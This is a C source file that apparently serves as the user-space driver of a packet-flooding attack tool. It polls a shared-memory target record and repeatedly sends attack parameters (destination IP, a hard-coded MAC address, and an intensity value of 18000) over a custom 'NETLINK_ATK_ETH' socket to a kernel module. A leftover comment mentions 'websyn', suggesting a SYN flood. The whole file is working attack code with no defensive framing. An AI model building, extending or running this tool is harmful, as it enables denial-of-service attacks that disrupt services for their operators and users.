#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <memory.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <unistd.h>

#include <stdio.h>

#include <stdlib.h>

#include <sys/socket.h>

#include <sys/types.h>

#include <string.h>

#include <asm/types.h>

#include <linux/netlink.h>

#include <linux/socket.h>

#include <linux/if.h>

#include <sys/shm.h>

#include "atk.h"

struct sockaddr_nl src_addr, dest_addr;

struct nlmsghdr *nlh = NULL;

struct iovec iov;

int sock_fd;

struct msghdr msg;

#define ETH_ALEN	6		/* Octets in one ethernet addr	 */


struct atk_info *atk_info_p;

int call_atk(void);

main()
{
	int shmid;

	shmid  = shmget(KEY,sizeof(struct atk_info),IPC_CREAT|0600|IPC_PRIVATE);

	atk_info_p = (struct atk_info*)shmat(shmid,NULL,0);

	for(;;)
	{
		if(atk_info_p->dst_ip!=0)
		{
			call_atk();
		}
		/*usleep(5000);*/
	}
}


int call_atk(void)

{
        sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ATK_ETH);

        memset(&msg, 0, sizeof(msg));

        memset(&src_addr, 0, sizeof(src_addr));

        src_addr.nl_family = AF_NETLINK;

        src_addr.nl_pid = getpid(); /* self pid */

        src_addr.nl_groups = 0; /* not in mcast groups */

        bind(sock_fd, (struct sockaddr*)&src_addr, sizeof(src_addr));

        memset(&dest_addr, 0, sizeof(dest_addr));

        dest_addr.nl_family = AF_NETLINK;

        dest_addr.nl_pid = 0; /* For Linux Kernel */

        dest_addr.nl_groups = 0; /* unicast */



        nlh=(struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct atk_info)));

        /* Fill the netlink message header */

        nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct atk_info));

        nlh->nlmsg_pid = getpid(); /* self pid */

        nlh->nlmsg_flags = 0;

        /* Fill in the netlink message payload */
		
        /* Fill in the netlink message payload */

				atk_info_p->eth_dst[0]=0x00;

                atk_info_p->eth_dst[1]=0xd0;

                atk_info_p->eth_dst[2]=0x04;

                atk_info_p->eth_dst[3]=0x12;

                atk_info_p->eth_dst[4]=0x37;

                atk_info_p->eth_dst[5]=0xfc;


		atk_info_p->degree=18000;

        memcpy(NLMSG_DATA(nlh), atk_info_p, sizeof(struct atk_info)); 



        iov.iov_base = (void *)nlh;

        iov.iov_len = nlh->nlmsg_len;

        msg.msg_name = (void *)&dest_addr;

        msg.msg_namelen = sizeof(dest_addr);

        msg.msg_iov = &iov;

        msg.msg_iovlen = 1;

		/*printf(" call websyn. ...\n");*/
		sendmsg(sock_fd, &msg, 0);

		/* Read message from kernel */
		memset(nlh, 0, NLMSG_SPACE(sizeof(int)));
		/*printf(" Waiting message. ...\n");*/
		recvmsg(sock_fd, &msg, 0);
		printf(".");
		/*printf(" Received message payload: %d\n",*((int *)NLMSG_DATA(nlh)));*/

         /* Close Netlink Socket */
		free(nlh);
        close(sock_fd);

}
